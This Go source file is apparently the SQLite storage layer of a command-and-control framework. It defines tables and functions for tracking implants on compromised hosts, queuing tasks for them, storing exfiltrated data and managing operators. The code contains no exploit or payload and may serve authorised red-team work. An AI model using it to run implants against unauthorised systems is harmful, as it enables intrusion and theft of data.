// Package store provides the database abstraction layer.
package store

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"sync"
	"time"

	_ "github.com/mattn/go-sqlite3"
	"github.com/saviorSEC/ranger/internal/protocol"
)

// Store wraps the SQLite database.
type Store struct {
	db *sql.DB
	mu sync.RWMutex
}

// New opens or creates the SQLite database.
func New(path string) (*Store, error) {
	db, err := sql.Open("sqlite3", path+"?_journal_mode=WAL&_busy_timeout=5000")
	if err != nil {
		return nil, fmt.Errorf("open db: %w", err)
	}
	s := &Store{db: db}
	if err := s.migrate(); err != nil {
		return nil, fmt.Errorf("migrate: %w", err)
	}
	return s, nil
}

func (s *Store) migrate() error {
	s.mu.Lock()
	defer s.mu.Unlock()

	tx, err := s.db.Begin()
	if err != nil {
		return err
	}
	defer tx.Rollback()

	stmts := []string{
		`CREATE TABLE IF NOT EXISTS implants (
			id TEXT PRIMARY KEY,
			impl_type TEXT NOT NULL DEFAULT 'windows',
			target_proc TEXT,
			hostname TEXT,
			arch TEXT,
			first_seen DATETIME NOT NULL,
			last_seen DATETIME NOT NULL,
			beacon_count INTEGER DEFAULT 0,
			tasks_sent INTEGER DEFAULT 0,
			tasks_done INTEGER DEFAULT 0,
			jitter_score REAL DEFAULT 1.0,
			dns_enabled INTEGER DEFAULT 0,
			mesh_enabled INTEGER DEFAULT 0,
			flagged INTEGER DEFAULT 0,
			node_id TEXT,
			metadata TEXT
		)`,
		`CREATE TABLE IF NOT EXISTS tasks (
			id TEXT PRIMARY KEY,
			implant_id TEXT NOT NULL,
			task_type TEXT NOT NULL,
			payload TEXT,
			created_at DATETIME NOT NULL,
			executed_at DATETIME,
			result TEXT,
			status TEXT DEFAULT 'pending',
			channel TEXT DEFAULT 'primary',
			FOREIGN KEY(implant_id) REFERENCES implants(id)
		)`,
		`CREATE TABLE IF NOT EXISTS mesh_nodes (
			id TEXT PRIMARY KEY,
			addr TEXT NOT NULL,
			pubkey BLOB,
			last_seen DATETIME NOT NULL,
			implant_count INTEGER DEFAULT 0,
			version TEXT
		)`,
		`CREATE TABLE IF NOT EXISTS exfil_data (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			implant_id TEXT NOT NULL,
			data_type TEXT,
			data BLOB,
			channel TEXT DEFAULT 'primary',
			received_at DATETIME NOT NULL,
			FOREIGN KEY(implant_id) REFERENCES implants(id)
		)`,
		`CREATE TABLE IF NOT EXISTS operators (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			username TEXT UNIQUE NOT NULL,
			password_hash TEXT NOT NULL,
			role TEXT DEFAULT 'operator',
			created_at DATETIME NOT NULL
		)`,
	}
	for _, stmt := range stmts {
		if _, err := tx.Exec(stmt); err != nil {
			return fmt.Errorf("stmt %q: %w", stmt[:60], err)
		}
	}
	return tx.Commit()
}

// Close closes the database.
func (s *Store) Close() error {
	return s.db.Close()
}

// UpsertImplant creates or updates an implant record.
func (s *Store) UpsertImplant(ir *protocol.ImplantRecord) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	now := time.Now().UTC()
	_, err := s.db.Exec(`
		INSERT INTO implants (id, impl_type, target_proc, hostname, arch, first_seen, last_seen, beacon_count, jitter_score, dns_enabled, mesh_enabled, flagged, node_id)
		VALUES (?, ?, ?, ?, ?, ?, ?, 1, ?, ?, ?, ?, ?)
		ON CONFLICT(id) DO UPDATE SET
			last_seen = excluded.last_seen,
			beacon_count = beacon_count + 1,
			target_proc = COALESCE(excluded.target_proc, target_proc),
			hostname = COALESCE(excluded.hostname, hostname),
			jitter_score = excluded.jitter_score,
			dns_enabled = excluded.dns_enabled,
			mesh_enabled = excluded.mesh_enabled,
			node_id = COALESCE(excluded.node_id, node_id)
	`, ir.ID, ir.Type, ir.TargetProc, ir.Hostname, ir.Arch, now, now,
		ir.JitterScore, boolToInt(ir.DNSEnabled), boolToInt(ir.MeshEnabled),
		boolToInt(ir.Flagged), ir.NodeID)
	return err
}

// GetImplant retrieves a single implant.
func (s *Store) GetImplant(id string) (*protocol.ImplantRecord, error) {
	s.mu.RLock()
	defer s.mu.RUnlock()

	row := s.db.QueryRow(`SELECT id, impl_type, target_proc, hostname, arch, first_seen, last_seen, beacon_count, tasks_sent, tasks_done, jitter_score, dns_enabled, mesh_enabled, flagged, node_id FROM implants WHERE id = ?`, id)
	ir := &protocol.ImplantRecord{}
	var dnsEn, meshEn, flagged int
	err := row.Scan(&ir.ID, &ir.Type, &ir.TargetProc, &ir.Hostname, &ir.Arch, &ir.FirstSeen, &ir.LastSeen, &ir.BeaconCount, &ir.TasksSent, &ir.TasksDone, &ir.JitterScore, &dnsEn, &meshEn, &flagged, &ir.NodeID)
	if err != nil {
		return nil, err
	}
	ir.DNSEnabled = dnsEn == 1
	ir.MeshEnabled = meshEn == 1
	ir.Flagged = flagged == 1
	return ir, nil
}

// ListImplants returns all implant records.
func (s *Store) ListImplants() ([]protocol.ImplantRecord, error) {
	s.mu.RLock()
	defer s.mu.RUnlock()

	rows, err := s.db.Query(`SELECT id, impl_type, target_proc, hostname, arch, first_seen, last_seen, beacon_count, tasks_sent, tasks_done, jitter_score, dns_enabled, mesh_enabled, flagged, node_id FROM implants ORDER BY last_seen DESC`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var out []protocol.ImplantRecord
	for rows.Next() {
		var ir protocol.ImplantRecord
		var dnsEn, meshEn, flagged int
		if err := rows.Scan(&ir.ID, &ir.Type, &ir.TargetProc, &ir.Hostname, &ir.Arch, &ir.FirstSeen, &ir.LastSeen, &ir.BeaconCount, &ir.TasksSent, &ir.TasksDone, &ir.JitterScore, &dnsEn, &meshEn, &flagged, &ir.NodeID); err != nil {
			return nil, err
		}
		ir.DNSEnabled = dnsEn == 1
		ir.MeshEnabled = meshEn == 1
		ir.Flagged = flagged == 1
		out = append(out, ir)
	}
	return out, rows.Err()
}

// ImplantCount returns the total number of implants.
func (s *Store) ImplantCount() (int, error) {
	s.mu.RLock()
	defer s.mu.RUnlock()
	var n int
	err := s.db.QueryRow(`SELECT COUNT(*) FROM implants`).Scan(&n)
	return n, err
}

// CreateTask inserts a new task.
func (s *Store) CreateTask(implantID, taskType, channel string, payload map[string]any) (*protocol.Task, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	task := &protocol.Task{
		ID:        fmt.Sprintf("T%d", time.Now().UnixNano()),
		Type:      taskType,
		Payload:   payload,
		Timestamp: time.Now().Unix(),
		TTL:       3600,
	}
	payloadJSON, _ := json.Marshal(payload)
	_, err := s.db.Exec(`INSERT INTO tasks (id, implant_id, task_type, payload, created_at, status, channel) VALUES (?, ?, ?, ?, ?, 'pending', ?)`,
		task.ID, implantID, taskType, string(payloadJSON), time.Now().UTC(), channel)
	if err != nil {
		return nil, err
	}
	s.db.Exec(`UPDATE implants SET tasks_sent = tasks_sent + 1 WHERE id = ?`, implantID)
	return task, nil
}

// PendingTasks returns all pending tasks for an implant, marking them "delivered".
func (s *Store) PendingTasks(implantID string) ([]protocol.Task, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	rows, err := s.db.Query(`SELECT id, task_type, payload, created_at, channel FROM tasks WHERE implant_id = ? AND status = 'pending'`, implantID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var tasks []protocol.Task
	for rows.Next() {
		var t protocol.Task
		var payloadStr, channel string
		var createdAt time.Time
		if err := rows.Scan(&t.ID, &t.Type, &payloadStr, &createdAt, &channel); err != nil {
			return nil, err
		}
		json.Unmarshal([]byte(payloadStr), &t.Payload)
		t.Timestamp = createdAt.Unix()
		tasks = append(tasks, t)
	}
	if err := rows.Err(); err != nil {
		return nil, err
	}

	// Mark as delivered
	for _, t := range tasks {
		s.db.Exec(`UPDATE tasks SET status = 'delivered' WHERE id = ?`, t.ID)
	}
	return tasks, nil
}

// CompleteTask marks a task as completed with the result.
func (s *Store) CompleteTask(taskID string, result *protocol.TaskResult) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	resultJSON, _ := json.Marshal(result)
	_, err := s.db.Exec(`UPDATE tasks SET status = 'completed', result = ?, executed_at = ? WHERE id = ?`,
		string(resultJSON), time.Now().UTC(), taskID)
	if err != nil {
		return err
	}
	s.db.Exec(`UPDATE implants SET tasks_done = tasks_done + 1 WHERE id = (SELECT implant_id FROM tasks WHERE id = ?)`, taskID)
	return nil
}

// ExfilData stores exfiltrated data.
func (s *Store) ExfilData(implantID, dataType, channel string, data []byte) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	_, err := s.db.Exec(`INSERT INTO exfil_data (implant_id, data_type, data, channel, received_at) VALUES (?, ?, ?, ?, ?)`,
		implantID, dataType, data, channel, time.Now().UTC())
	return err
}

// UpsertMeshNode creates or updates a mesh peer.
func (s *Store) UpsertMeshNode(node *protocol.MeshNode) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	_, err := s.db.Exec(`
		INSERT INTO mesh_nodes (id, addr, pubkey, last_seen, implant_count, version)
		VALUES (?, ?, ?, ?, ?, ?)
		ON CONFLICT(id) DO UPDATE SET
			addr = excluded.addr,
			last_seen = excluded.last_seen,
			implant_count = excluded.implant_count,
			version = excluded.version
	`, node.ID, node.Addr, node.PublicKey, time.Now().UTC(), node.Implants, node.Version)
	return err
}

// ListMeshNodes returns all known mesh peers.
func (s *Store) ListMeshNodes() ([]protocol.MeshNode, error) {
	s.mu.RLock()
	defer s.mu.RUnlock()

	rows, err := s.db.Query(`SELECT id, addr, last_seen, implant_count, version FROM mesh_nodes ORDER BY last_seen DESC`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var out []protocol.MeshNode
	for rows.Next() {
		var n protocol.MeshNode
		if err := rows.Scan(&n.ID, &n.Addr, &n.LastSeen, &n.Implants, &n.Version); err != nil {
			return nil, err
		}
		out = append(out, n)
	}
	return out, rows.Err()
}

func boolToInt(b bool) int {
	if b {
		return 1
	}
	return 0
}
